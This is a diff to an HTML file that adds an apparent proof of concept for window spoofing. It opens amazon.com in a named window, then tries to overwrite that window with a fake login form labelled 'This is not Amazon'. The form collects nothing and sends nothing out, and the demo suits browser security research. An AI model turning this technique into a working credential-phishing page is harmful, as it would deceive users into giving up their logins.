@@ -3,6 +3,33 @@
 </head>
 
 <body>
+<a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()" id="button">Spoof</a>
+</body>
+    
+    <script>
+    function startSpoof() {
+        var x = window.open('', 'x');
+        setTimeout(function() {
+            try {
+                x.document.write(`
+                    <h1>This is not Amazon</h1>
+                    <input type="text" placeholder="Username" id="username"><br>
+                    <input type="password" placeholder="Password" id="password"><br>
+                    <button>Click me</button>
+                `);
+                x.document.close();
+            } catch(e) {
+                console.log('Spoof failed:', e.message);
+            }
+        }, 100);
+    }
+    </script>
+
+<!-- <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<body>
     <button onclick="startSpoof()" id="button">Spoof</button>
 </body>
     
@@ -23,4 +50,4 @@
             }
         }, 100);
     }
-    </script>
+    </script> -->
